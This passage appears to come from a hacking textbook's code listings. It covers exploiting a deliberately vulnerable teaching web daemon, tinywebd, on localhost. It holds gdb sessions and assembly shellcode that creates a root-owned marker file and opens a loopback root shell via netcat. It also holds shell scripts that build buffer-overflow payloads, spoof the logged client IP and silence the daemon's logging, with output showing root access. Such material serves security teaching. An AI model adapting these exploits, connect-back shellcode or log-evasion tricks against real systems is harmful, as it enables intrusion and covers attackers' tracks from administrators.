eax,DWORD PTR [ebp-12]\n0x080487d4 <main+117>:  mov    DWORD PTR [esp+8],eax\n0x080487d8 <main+121>:  mov    eax,DWORD PTR [ebp-12]\n0x080487db <main+124>:  mov    DWORD PTR [esp+4],eax\n0x080487df <main+128>:  mov    DWORD PTR [esp],0x8048aaa\n0x080487e6 <main+135>:  call   0x8048490 <printf@plt>\n0x080487eb <main+140>:  mov    eax,DWORD PTR [ebp-16]\n0x080487ee <main+143>:  mov    DWORD PTR [esp+8],eax\n0x080487f2 <main+147>:  mov    eax,DWORD PTR [ebp-16]\n0x080487f5 <main+150>:  mov    DWORD PTR [esp+4],eax\n0x080487f9 <main+154>:  mov    DWORD PTR [esp],0x8048ac7\n0x08048800 <main+161>:  call   0x8048490 <printf@plt>\n`0x08048805 <main+166>:  mov    DWORD PTR [esp+8],0x180 0x0804880d <main+174>:  mov    DWORD PTR [esp+4],0x441 0x08048815 <main+182>:  mov    eax,DWORD PTR [ebp-16] 0x08048818 <main+185>:  mov    DWORD PTR [esp],eax 0x0804881b <main+188>: call 0x8048410 <open@plt>`\n---Type <return> to continue, or q <return> to quit---q\nQuit\n(gdb)\n```", "```\nBITS 32 \n; Mark the filesystem to prove you ran.\n   jmp short one\n   two:\n   pop ebx              ; Filename\n   xor ecx, ecx\n   mov BYTE [ebx+7], cl ; Null terminate filename\n   push BYTE 0x5        ; Open()\n   pop eax\n   mov WORD cx, 0x441   ; O_WRONLY|O_APPEND|O_CREAT\n   xor edx, edx\n   mov WORD dx, 0x180   ; S_IRUSR|S_IWUSR\n   int 0x80             ; Open file to create it.\n      ; eax = returned file descriptor\n   mov ebx, eax         ; File descriptor to second arg\n   push BYTE 0x6        ; Close ()\n   pop eax\n   int 0x80 ; Close file.\n\n   xor eax, eax\n   mov ebx, eax\n   inc eax    ; Exit call.\n   int 0x80   ; Exit(0), to avoid an infinite loop.\none:\n   call two\ndb \"/HackedX\"\n;   01234567\n```", "```\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ nasm mark.s\nreader@hacking:~/booksrc $ hexdump -C mark\n00000000  eb 23 5b 31 c9 88 4b 07  6a 05 58 66 b9 41 04 31  |.#[1.K.j.Xf.A.1|\n00000010  d2 66 ba 80 01 cd 80 89  c3 6a 06 58 cd 80 31 c0  |.f....j.X.1.|\n00000020  89 c3 40 cd 80 e8 d8 ff  ff ff 2f 48 61 63 6b 65  |.@..../Hacke|\n00000030  64 58                                             |dX|\n00000032\nreader@hacking:~/booksrc $ ls -l /Hacked\nls: /Hacked: No such file or directory\nreader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh mark 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: mark (44 bytes)\nfake request: \"GET / HTTP/1.1\\x00\" (15 bytes)\n[Fake Request (15 b)] [NOP (357 b)] [shellcode (44 b)] [ret addr (128 b)]\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $ ls -l /Hacked\n-rw------- 1 root reader 0 2007-09-17 16:59 /Hacked\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ gcc -g tinywebd.c\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) disass main\nDump of assembler code for function main:\n0x08048d93 <main+0>:    push   ebp\n0x08048d94 <main+1>:    mov    ebp,esp\n0x08048d96 <main+3>:    sub    esp,0x68\n0x08048d99 <main+6>:    and    esp,0xfffffff0\n0x08048d9c <main+9>:    mov    eax,0x0\n0x08048da1 <main+14>:   sub    esp,eax\n\n.:[ output trimmed ]:.\n\n0x08048f4b <main+440>:  mov    DWORD PTR [esp],eax\n0x08048f4e <main+443>:  call   0x8048860 <listen@plt>\n0x08048f53 <main+448>:  cmp    eax,0xffffffff\n0x08048f56 <main+451>:  jne    0x8048f64 <main+465>\n0x08048f58 <main+453>:  mov    DWORD PTR [esp],0x804961a\n0x08048f5f <main+460>:  call   0x8048ac4 <fatal>\n`0x08048f64 <main+465>:  nop 0x08048f65 <main+466>:  mov    DWORD PTR [ebp-60],0x10`\n0x08048f6c <main+473>:  lea    eax,[ebp-60]\n0x08048f6f <main+476>:  mov    DWORD PTR [esp+8],eax\n0x08048f73 <main+480>:  lea    eax,[ebp-56]\n0x08048f76 <main+483>:  mov    DWORD PTR [esp+4],eax\n0x08048f7a <main+487>:  mov    eax,ds:0x804a970\n0x08048f7f <main+492>:  mov    DWORD PTR [esp],eax\n0x08048f82 <main+495>:  call   0x80488d0 <accept@plt>\n0x08048f87 <main+500>:  mov    DWORD PTR [ebp-12],eax\n0x08048f8a <main+503>:  cmp    DWORD PTR [ebp-12],0xffffffff\n0x08048f8e <main+507>:  jne    0x8048f9c <main+521>\n0x08048f90 <main+509>:  mov    DWORD PTR [esp],0x804962e\n0x08048f97 <main+516>:  call   0x8048ac4 <fatal>\n0x08048f9c <main+521>:  mov    eax,ds:0x804a96c\n0x08048fa1 <main+526>:  mov    DWORD PTR [esp+8],eax\n0x08048fa5 <main+530>:  lea    eax,[ebp-56]\n0x08048fa8 <main+533>:  mov    DWORD PTR [esp+4],eax\n0x08048fac <main+537>:  mov    eax,DWORD PTR [ebp-12]\n0x08048faf <main+540>:  mov    DWORD PTR [esp],eax\n0x08048fb2 <main+543>:  call   0x8048fb9 <handle_connection>\n`0x08048fb7 <main+548>:  jmp    0x8048f65 <main+466>`\nEnd of assembler dump.\n(gdb)\n```", "```\n(gdb) disass handle_connection\nDump of assembler code for function handle_connection:\n`0x08048fb9 <handle_connection+0>:       push   ebp 0x08048fba <handle_connection+1>:       mov    ebp,esp 0x08048fbc <handle_connection+3>:       push   ebx 0x08048fbd <handle_connection+4>:       sub    esp,0x644`\n0x08048fc3 <handle_connection+10>:      lea    eax,[ebp-0x218]\n0x08048fc9 <handle_connection+16>:      mov    DWORD PTR [esp+4],eax\n0x08048fcd <handle_connection+20>:      mov    eax,DWORD PTR [ebp+8]\n0x08048fd0 <handle_connection+23>:      mov    DWORD PTR [esp],eax\n0x08048fd3 <handle_connection+26>:      call   0x8048cb0 <recv_line>\n0x08048fd8 <handle_connection+31>:      mov    DWORD PTR [ebp-0x620],eax\n0x08048fde <handle_connection+37>:      mov    eax,DWORD PTR [ebp+12]\n0x08048fe1 <handle_connection+40>:      movzx  eax,WORD PTR [eax+2]\n0x08048fe5 <handle_connection+44>:      mov    DWORD PTR [esp],eax\n0x08048fe8 <handle_connection+47>:      call   0x80488f0 <ntohs@plt>\n\n.:[ output trimmed ]:.\n\n0x08049302 <handle_connection+841>:     call   0x8048850 <write@plt>\n0x08049307 <handle_connection+846>:     mov    DWORD PTR [esp+4],0x2\n0x0804930f <handle_connection+854>:     mov    eax,DWORD PTR [ebp+8]\n0x08049312 <handle_connection+857>:     mov    DWORD PTR [esp],eax\n0x08049315 <handle_connection+860>:     call   0x8048800 <shutdown@plt>\n`0x0804931a <handle_connection+865>:     add    esp,0x644 0x08049320 <handle_connection+871>:     pop    ebx 0x08049321 <handle_connection+872>:     pop    ebp 0x08049322 <handle_connection+873>:     ret`\nEnd of assembler dump.\n(gdb)\n```", "```\nBITS 32\n; Mark the filesystem to prove you ran.\n   jmp short one\n   two:\n   pop ebx              ; Filename\n   xor ecx, ecx\n   mov BYTE [ebx+7], cl ; Null terminate filename\n   push BYTE 0x5        ; Open()\n   pop eax\n   mov WORD cx, 0x441   ; O_WRONLY|O_APPEND|O_CREAT\n   xor edx, edx\n   mov WORD dx, 0x180   ; S_IRUSR|S_IWUSR\n   int 0x80             ; Open file to create it.\n      ; eax = returned file descriptor\n   mov ebx, eax         ; File descriptor to second arg0\n   push BYTE 0x6        ; Close ()\n   pop eax\n   int 0x80  ; Close file.\n\n   int3   ; zinterrupt\none:\n   call two\ndb \"/HackedX\"\n```", "```\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ ps aux | grep tinywebd\nroot     23497  0.0  0.0   1636   356 ?        Ss   17:08   0:00 ./tinywebd\nreader   23506  0.0  0.0   2880   748 pts/1    R+   17:09   0:00 grep tinywebd\nreader@hacking:~/booksrc $ gcc -g tinywebd.c\nreader@hacking:~/booksrc $ sudo gdb -q -pid=23497 --symbols=./a.out\n\nwarning: not using untrusted file \"/home/reader/.gdbinit\"\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nAttaching to process 23497\n/cow/home/reader/booksrc/tinywebd: No such file or directory.\nA program is being debugged already.  Kill it? (y or n) n\nProgram not killed.\n(gdb) set dis intel\n(gdb) x/5i main+533\n0x8048fa8 <main+533>:   mov    DWORD PTR [esp+4],eax\n0x8048fac <main+537>:   mov    eax,DWORD PTR [ebp-12]\n0x8048faf <main+540>:   mov    DWORD PTR [esp],eax\n`0x8048fb2 <main+543>:   call   0x8048fb9 <handle_connection>`\n0x8048fb7 <main+548>:   jmp    0x8048f65 <main+466>\n(gdb) break *0x8048fb2\nBreakpoint 1 at 0x8048fb2: file tinywebd.c, line 72.\n(gdb) cont\nContinuing.\n```", "```\nreader@hacking:~/booksrc $ nasm mark_break.s\nreader@hacking:~/booksrc $ ./xtool_tinywebd.sh mark_break 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: mark_break (44 bytes)\n[NOP (372 bytes)] [shellcode (44 bytes)] [ret addr (128 bytes)]\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $\n```", "```\nBreakpoint 1, 0x08048fb2 in main () at tinywebd.c:72\n72            handle_connection(new_sockfd, &client_addr, logfd);\n(gdb) i r esp ebx ebp\nesp            0xbffff7e0       0xbffff7e0\nebx            0xb7fd5ff4       -1208131596\nebp            0xbffff848       0xbffff848\n(gdb) cont\nContinuing.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n0xbffff753 in ?? ()\n(gdb) i r esp ebx ebp\nesp            0xbffff7e0       0xbffff7e0\nebx            0x6      6\nebp            0xbffff624       0xbffff624\n(gdb)\n```", "```\n(gdb) set dis intel\n(gdb) x/5i main\n0x8048d93 <main>:       push   ebp\n0x8048d94 <main+1>:     mov    ebp,esp\n0x8048d96 <main+3>:     sub    esp,0x68\n0x8048d99 <main+6>:     and    esp,0xfffffff0\n0x8048d9c <main+9>:     mov    eax,0x0\n(gdb) x/5i main+533\n0x8048fa8 <main+533>:   mov    DWORD PTR [esp+4],eax\n0x8048fac <main+537>:   mov    eax,DWORD PTR [ebp-12]\n0x8048faf <main+540>:   mov    DWORD PTR [esp],eax\n0x8048fb2 <main+543>:   call   0x8048fb9 <handle_connection>\n`0x8048fb7 <main+548>:   jmp    0x8048f65 <main+466>`\n(gdb)\n```", "```\nBITS 32\n; Mark the filesystem to prove you ran.\n   jmp short one\n   two:\n   pop ebx              ; Filename\n   xor ecx, ecx\n   mov BYTE [ebx+7], cl ; Null terminate filename\n   push BYTE 0x5        ; Open()\n   pop eax\n   mov WORD cx, 0x441   ; O_WRONLY|O_APPEND|O_CREAT\n   xor edx, edx\n   mov WORD dx, 0x180   ; S_IRUSR|S_IWUSR\n   int 0x80             ; Open file to create it.\n      ; eax = returned file descriptor\n   mov ebx, eax         ; File descriptor to second arg\n   push BYTE 0x6        ; Close ()\n   pop eax\n   int 0x80  ; close file\n\n   lea ebp, [esp+0x68]  ; Restore EBP.\n   push 0x08048fb7      ; Return address.\n   ret                  ; Return\none:\n   call two\ndb \"/HackedX\"\n```", "```\nreader@hacking:~/booksrc $ nasm mark_restore.s\nreader@hacking:~/booksrc $ hexdump -C mark_restore\n00000000  eb 26 5b 31 c9 88 4b 07  6a 05 58 66 b9 41 04 31  |.&[1.K.j.Xf.A.1|\n00000010  d2 66 ba 80 01 cd 80 89  c3 6a 06 58 cd 80 8d 6c  |.f....j.X..l|\n00000020  24 68 68 b7 8f 04 08 c3  e8 d5 ff ff ff 2f 48 61  |$hh...../Ha|\n00000030  63 6b 65 64 58                                    |ckedX|\n00000035\nreader@hacking:~/booksrc $ sudo rm /Hacked\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh mark_restore 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: mark_restore (53 bytes)\nfake request: \"GET / HTTP/1.1\\x00\" (15 bytes)\n[Fake Request (15 b)] [NOP (348 b)] [shellcode (53 b)] [ret addr (128 b)]\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $ ls -l /Hacked\n-rw------- 1 root reader 0 2007-09-19 20:37 /Hacked\nreader@hacking:~/booksrc $ ps aux | grep tinywebd\nroot     26787  0.0  0.0   1636   420 ?        Ss   20:37   0:00 ./tinywebd\nreader   26828  0.0  0.0   2880   748 pts/1    R+   20:38   0:00 grep tinywebd\nreader@hacking:~/booksrc $ ./webserver_id 127.0.0.1\nThe web server for 127.0.0.1 is Tiny webserver\nreader@hacking:~/booksrc $\n```", "```\nBITS 32\n\n   push BYTE 0x02    ; Fork is syscall #2\n   pop eax\n   int 0x80          ; After the fork, in child process eax == 0.\n   test eax, eax\n   jz child_process  ; In child process spawns a shell.\n\n; In the parent process, restore tinywebd.\n   lea ebp, [esp+0x68]  ; Restore EBP.\n   push 0x08048fb7      ; Return address.\n   ret                  ; Return\n\nchild_process:\n; s = socket(2, 1, 0)\n  push BYTE 0x66    ; Socketcall is syscall #102 (0x66)\n  pop eax\n  cdq               ; Zero out edx for use as a null DWORD later.\n  xor ebx, ebx      ; ebx is the type of socketcall.\n  inc ebx           ; 1 = SYS_SOCKET = socket()\n  push edx          ; Build arg array: { protocol = 0,\n  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,\n  push BYTE 0x2     ;                    AF_INET = 2 }\n  mov ecx, esp      ; ecx = ptr to argument array\n  int 0x80          ; After syscall, eax has socket file descriptor.\n .: [ Output trimmed; the rest is the same as loopback_shell.s. ] :.\n```", "```\nreader@hacking:~/booksrc $ nasm loopback_shell_restore.s\nreader@hacking:~/booksrc $ hexdump -C loopback_shell_restore\n00000000  6a 02 58 cd 80 85 c0 74  0a 8d 6c 24 68 68 b7 8f  |j.X..t.l$hh.|\n00000010  04 08 c3 6a 66 58 99 31  db 43 52 6a 01 6a 02 89  |..jfX.1.CRj.j.|\n00000020  e1 cd 80 96 6a 66 58 43  68 7f bb bb 01 66 89 54  |..jfXCh..f.T|\n00000030  24 01 66 68 7a 69 66 53  89 e1 6a 10 51 56 89 e1  |$.fhzifS.j.QV.|\n00000040  43 cd 80 87 f3 87 ce 49  b0 3f cd 80 49 79 f9 b0  |C...I.?.Iy.|\n00000050  0b 52 68 2f 2f 73 68 68  2f 62 69 6e 89 e3 52 89  |.Rh//shh/bin.R.|\n00000060  e2 53 89 e1 cd 80                                 |.S..|\n00000066\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ nc -l -p 31337 &\n[1] 27279\nreader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh loopback_shell_restore 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: loopback_shell_restore (102 bytes)\nfake request: \"GET / HTTP/1.1\\x00\" (15 bytes)\n[Fake Request (15 b)] [NOP (299 b)] [shellcode (102 b)] [ret addr (128 b)]\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $ fg\nnc -l -p 31337\nwhoami\nroot\n\n[1]+  Stopped                 nc -l -p 31337\nreader@hacking:~/booksrc $ ./webserver_id 127.0.0.1\nThe web server for 127.0.0.1 is Tiny webserver\nreader@hacking:~/booksrc $ fg\nnc -l -p 31337\nwhoami\nroot\n```", "```\nvoid handle_connection(int sockfd, struct sockaddr_in *`client_addr_ptr,` int logfd) {\n   unsigned char *ptr, request[500], resource[500], log_buffer[500];\n   int fd, length;\n\n   length = recv_line(sockfd, request);\n\n   sprintf(log_buffer, \"From %s:%d \\\"%s\\\"\\t\", inet_ntoa(`client_addr_ptr->sin_addr`),\nntohs(`client_addr_ptr->sin_port`), request);\n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\nint main(int argc, char *argv[]) {\n   struct sockaddr_in addr;\n   if(argc != 3) {\n      printf(\"Usage: %s <target IP> <target port>\\n\", argv[0]);\n      exit(0);\n   }\n   addr.sin_family = AF_INET;\n   addr.sin_port = htons(atoi(argv[2]));\n   addr.sin_addr.s_addr = inet_addr(argv[1]);\n\n   write(1, &addr, sizeof(struct sockaddr_in));\n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o addr_struct addr_struct.c\nreader@hacking:~/booksrc $ ./addr_struct 12.34.56.78 9090\n##\n   \"8N_reader@hacking:~/booksrc $\nreader@hacking:~/booksrc $ ./addr_struct 12.34.56.78 9090 | hexdump -C\n00000000  02 00 23 82 0c 22 38 4e  00 00 00 00 f4 5f fd b7  |.#.\"8N..._.|\n00000010\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ grep 0x xtool_tinywebd_steath.sh\nRETADDR=\"\\x24\\xf6\\xff\\xbf\" # at +100 bytes from buffer @ 0xbffff5c0\nreader@hacking:~/booksrc $ gdb -q -batch -ex \"p /x 0xbffff5c0 + 15\"\n$1 = 0xbffff5cf\nreader@hacking:~/booksrc $\n```", "```\n#!/bin/sh\n# IP spoofing stealth exploitation tool for tinywebd\n\nSPOOFIP=\"12.34.56.78\"\nSPOOFPORT=\"9090\"\n\nif [ -z \"$2\" ]; then # If argument 2 is blank\n   echo \"Usage: $0 <shellcode file> <target IP>\"\n   exit\nfi\nFAKEREQUEST=\"GET / HTTP/1.1\\x00\"\nFR_SIZE=$(perl -e \"print \\\"$FAKEREQUEST\\\"\" | wc -c | cut -f1 -d ' ')\nOFFSET=540\nRETADDR=\"\\x24\\xf6\\xff\\xbf\" # At +100 bytes from buffer @ 0xbffff5c0\nFAKEADDR=\"\\xcf\\xf5\\xff\\xbf\" # +15 bytes from buffer @ 0xbffff5c0\necho \"target IP: $2\"\nSIZE=`wc -c $1 | cut -f1 -d ' '`\necho \"shellcode: $1 ($SIZE bytes)\"\necho \"fake request: \\\"$FAKEREQUEST\\\" ($FR_SIZE bytes)\"\nALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE - 16))\n\necho \"[Fake Request $FR_SIZE] [spoof IP 16] [NOP $ALIGNED_SLED_SIZE] [shellcode $SIZE]\n [ret\naddr 128] [*fake_addr 8]\"\n(perl -e \"print \\\"$FAKEREQUEST\\\"\";\n ./addr_struct \"$SPOOF IP\" \"$SPOOFPORT\";\n perl -e \"print \\\"\\x90\\\"x$ALIGNED_SLED_SIZE\";\n cat $1;\nperl -e \"print \\\"$RETADDR\\\"x32 . \\\"$FAKEADDR\\\"x2 . \\\"\\r\\n\\\"\") | nc -w 1 -v $2 80\n```", "```\nreader@hacking:~/booksrc $ ps aux | grep tinywebd\nroot     27264  0.0  0.0   1636   420 ?        Ss   20:47   0:00 ./tinywebd\nreader   30648  0.0  0.0   2880   748 pts/2    R+   22:29   0:00 grep tinywebd\nreader@hacking:~/booksrc $ gcc -g tinywebd.c\nreader@hacking:~/booksrc $ sudo gdb -q—pid=27264 --symbols=./a.out\n\nwarning: not using untrusted file \"/home/reader/.gdbinit\"\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nAttaching to process 27264\n/cow/home/reader/booksrc/tinywebd: No such file or directory.\nA program is being debugged already. Kill it? (y or n) n\nProgram not killed.\n(gdb) list handle_connection\n77      /* This function handles the connection on the passed socket from the\n78       * passed client address and logs to the passed FD. The connection is\n79       * processed as a web request, and this function replies over the connected\n80       * socket. Finally, the passed socket is closed at the end of the function.\n81       */\n82      void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd)\n {\n83         unsigned char *ptr, request[500], resource[500], log_buffer[500];\n84         int fd, length;\n85\n86         length = recv_line(sockfd, request);\n(gdb)\n87\n88         sprintf(log_buffer, \"From %s:%d \\\"%s\\\"\\t\", inet_ntoa(client_addr_ptr->sin_addr),\nntohs(client_addr_ptr->sin_port), request);\n89\n90         ptr = strstr(request, \" HTTP/\"); // Search for valid looking request.\n91         if(ptr == NULL) { // Then this isn't valid HTTP\n92            strcat(log_buffer, \" NOT HTTP!\\n\");\n93         } else {\n94            *ptr = 0; // Terminate the buffer at the end of the URL.\n95            ptr = NULL; // Set ptr to NULL (used to flag for an invalid request).\n96            if(strncmp(request, \"GET \", 4) == 0)  // Get request\n(gdb) break 86\nBreakpoint 1 at 0x8048fc3: file tinywebd.c, line 86.\n(gdb) break 89\nBreakpoint 2 at 0x8049028: file tinywebd.c, line 89.\n(gdb) cont\nContinuing.\n```", "```\nreader@hacking:~/booksrc $ ./xtool_tinywebd_spoof.sh mark_restore 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: mark_restore (53 bytes)\nfake request: \"GET / HTTP/1.1\\x00\" (15 bytes)\n[Fake Request 15] [spoof IP 16] [NOP 332] [shellcode 53] [ret addr 128]\n[*fake_addr 8]\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $\n```", "```\nBreakpoint 1, handle_connection (sockfd=9, client_addr_ptr=0xbffff810, logfd=3) at\ntinywebd.c:86\n86         length = recv_line(sockfd, request);\n(gdb) bt\n#0  handle_connection (sockfd=9, client_addr_ptr=0xbffff810, logfd=3) at tinywebd.c:86\n#1  0x08048fb7 in main () at tinywebd.c:72\n(gdb) print client_addr_ptr\n$1 = (struct sockaddr_in *) 0xbffff810\n(gdb) print *client_addr_ptr\n$2 = {sin_family = 2, sin_port = 15284, sin_addr = {s_addr = 16777343},\nsin_zero = \"\\000\\000\\000\\000\\000\\000\\000\"}\n(gdb) x/x &client_addr_ptr\n0xbffff7e4:     0xbffff810\n(gdb) x/24x request + 500\n0xbffff7b4:     0xbffff624      0xbffff624      0xbffff624      0xbffff624\n0xbffff7c4:     0xbffff624      0xbffff624      0x0804b030      0xbffff624\n0xbffff7d4:     0x00000009      0xbffff848      0x08048fb7      0x00000009\n`0xbffff7e4:     0xbffff810`      0x00000003      0xbffff838      0x00000004\n0xbffff7f4:     0x00000000      0x00000000      0x08048a30      0x00000000\n0xbffff804:     0x0804a8c0      0xbffff818      0x00000010      0x3bb40002\n(gdb) cont\nContinuing.\n\nBreakpoint 2, handle_connection (sockfd=-1073744433, client_addr_ptr=0xbffff5cf, \nlogfd=2560)\nat tinywebd.c:90\n90         ptr = strstr(request, \" HTTP/\"); // Search for valid-looking request.\n(gdb) x/24x request + 500\n0xbffff7b4:     0xbffff624      0xbffff624      0xbffff624      0xbffff624\n0xbffff7c4:     0xbffff624      0xbffff624      0xbffff624      0xbffff624\n0xbffff7d4:     0xbffff624      0xbffff624      0xbffff624      0xbffff5cf\n`0xbffff7e4:     0xbffff5cf`      0x00000a00      0xbffff838      0x00000004\n0xbffff7f4:     0x00000000      0x00000000      0x08048a30      0x00000000\n0xbffff804:     0x0804a8c0      0xbffff818      0x00000010      0x3bb40002\n(gdb) print client_addr_ptr\n$3 = (struct sockaddr_in *) 0xbffff5cf\n(gdb) print client_addr_ptr\n$4 = (struct sockaddr_in *) 0xbffff5cf\n(gdb) print *client_addr_ptr\n$5 = {sin_family = 2, sin_port = 33315, sin_addr = {s_addr = 1312301580},\nsin_zero = \"\\000\\000\\000\\000_\n(gdb) x/s log_buffer\n0xbffff1c0:      \"From 12.34.56.78:9090 \\\"GET / HTTP/1.1\\\"\\t\"\n(gdb)\n```", "```\n(gdb) x/xw &client_addr_ptr\n0xbffff7e4:     0xbffff5cf\n(gdb) x/xw &logfd\n0xbffff7e8:     0x00000a00\n(gdb) x/4xb &logfd\n0xbffff7e8:     0x00    0x0a    0x00    0x00\n(gdb) x/8xb &client_addr_ptr\n0xbffff7e4:     0xcf    0xf5    0xff    0xbf    0x00    0x0a    0x00    0x00\n(gdb) p logfd\n$6 = 2560\n(gdb) quit\nThe program is running.  Quit anyway (and detach it)? (y or n) y\nDetaching from program: , process 27264\nreader@hacking:~/booksrc $ sudo kill 27264\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ ps aux | grep tinywebd\nroot       478  0.0  0.0   1636   420 ?        Ss   23:24   0:00 ./tinywebd\nreader     525  0.0  0.0   2880   748 pts/1    R+   23:24   0:00 grep tinywebd\nreader@hacking:~/booksrc $ sudo strace -p 478 -e trace=write\nProcess 478 attached - interrupt to quit\nwrite(2560, \"09/19/2007 23:29:30> \", 21) = -1 EBADF (Bad file descriptor)\nwrite(2560, \"From 12.34.56.78:9090 \\\"GET / HTT\".., 47) = -1 EBADF (Bad file descriptor)\nProcess 478 detached\nreader@hacking:~/booksrc $\n```", "```\n#!/bin/sh\n# Silent stealth exploitation tool for tinywebd\n#    also spoofs IP address stored in memory\n\nSPOOFIP=\"12.34.56.78\"\nSPOOFPORT=\"9090\"\n\nif [ -z \"$2\" ]; then # If argument 2 is blank\n   echo \"Usage: $0 <shellcode file> <target IP>\"\n   exit\nfi\nFAKEREQUEST=\"GET / HTTP/1.1\\x00\"\nFR_SIZE=$(perl -e \"print \\\"$FAKEREQUEST\\\"\" | wc -c | cut -f1 -d ' ')\nOFFSET=540\nRETADDR=\"\\x24\\xf6\\xff\\xbf\" # At +100 bytes from buffer @ 0xbffff5c0\nFAKEADDR=\"\\xcf\\xf5\\xff\\xbf\" # +15 bytes from buffer @ 0xbffff5c0\necho \"target IP: $2\"\nSIZE=`wc -c $1 | cut -f1 -d ' '`\necho \"shellcode: $1 ($SIZE bytes)\"\necho \"fake request: \\\"$FAKEREQUEST\\\" ($FR_SIZE bytes)\"\nALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE - 16))\n\necho \"[Fake Request $FR_SIZE] [spoof IP 16] [NOP $ALIGNED_SLED_SIZE] [shellcode $SIZE] \n[ret\naddr 128] [*fake_addr 8]\"\n(perl -e \"print \\\"$FAKEREQUEST\\\"\";\n ./addr_struct \"$SPOOFIP\" \"$SPOOFPORT\";\n perl -e \"print \\\"\\x90\\\"x$ALIGNED_SLED_SIZE\";\n cat $1;\nperl -e \"print \\\"$RETADDR\\\"x32 . \\\"$FAKEADDR\\\"x2 . \\\"\\x01\\x00\\x00\\x00\\r\\n\\\"\") | nc -w 1\n -v $2\n80\n```", "```\nreader@hacking:~/booksrc $ sudo rm /Hacked\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon..\nreader@hacking:~/booksrc $ ls -l /var/log/tinywebd.log\n-rw------- 1 root reader 6526 2007-09-19 23:24 /var/log/tinywebd.log\nreader@hacking:~/booksrc $ ./xtool_tinywebd_silent.sh mark_restore 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: mark_restore (53 bytes)\nfake request: \"GET / HTTP/1.1\\x00\" (15 bytes)\n[Fake Request 15] [spoof IP 16] [NOP 332] [shellcode 53] [ret addr 128] [*fake_addr 8]\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $ ls -l /var/log/tinywebd.log\n-rw------- 1 root reader 6526 2007-09-19 23:24 /var/log/tinywebd.log\nreader@hacking:~/booksrc $ ls -l /Hacked\n-rw------- 1 root reader 0 2007-09-19 23:35 /Hacked\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ps aux | grep tinywebd\nroot       478  0.0 0.0    1636   420 ?        Ss   23:24   0:00 ./tinywebd\nreader    1005  0.0 0.0    2880   748 pts/1    R+   23:36   0:00 grep tinywebd\nreader@hacking:~/booksrc $ sudo strace -p 478 -e trace=write\nProcess 478 attached - interrupt to quit\nwrite(1, \"09/19/2007 23:36:31> \", 21)   = 21\nwrite(1, \"From 12.34.56.78:9090 \\\"GET / HTT\".., 47) = 47\nProcess 478 detached\nreader@hacking:~/booksrc $\n```", "```\n   while(1) { // Accept loop\n      sin_size = sizeof(struct sockaddr_in);\n      new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\n      if(new_sockfd == -1)\n         fatal(\"accepting connection\");\n\n      handle_connection(new_sockfd, &client_addr, logfd);\n   }\n   return 0;\n}\n\n/* This function handles the connection on the passed socket from the\n * passed client address and logs to the passed FD. The connection is\n * processed as a web request, and this function replies over the connected\n * socket. Finally, the passed socket is closed at the end of the function.\n */\nvoid handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) {\n   unsigned char *ptr, request[500], resource[500], log_buffer[500];\n   int fd, length;\n\n   length = recv_line(sockfd, request);\n```", "```\nreader@hacking:~/booksrc $ ps aux | grep tinywebd\nroot       478  0.0  0.0   1636   420 ?        Ss   23:24   0:00 ./tinywebd\nreader    1284  0.0  0.0   2880   748 pts/1    R+   23:42   0:00 grep tinywebd\nreader@hacking:~/booksrc $ gcc -g tinywebd.c\nreader@hacking:~/booksrc $ sudo gdb -q-pid=478 --symbols=./a.out\nwarning: not using untrusted file \"/home/reader/.gdbinit\"\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nAttaching to process 478\n/cow/home/reader/booksrc/tinywebd: No such file or directory.\nA program is being debugged already. Kill it? (y or n) n\nProgram not killed.\n(gdb) list handle_connection\n77      /* This function handles the connection on the passed socket from the\n78       * passed client address and logs to the passed FD. The connection is\n79       * processed as a web request, and this function replies over the connected\n80       * socket. Finally, the passed socket is closed at the end of the function.\n81       */\n82      void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd)\n {\n83         unsigned char *ptr, request[500], resource[500], log_buffer[500];\n84         int fd, length;\n85\n86         length = recv_line(sockfd, request);\n(gdb) break 86\nBreakpoint 1 at 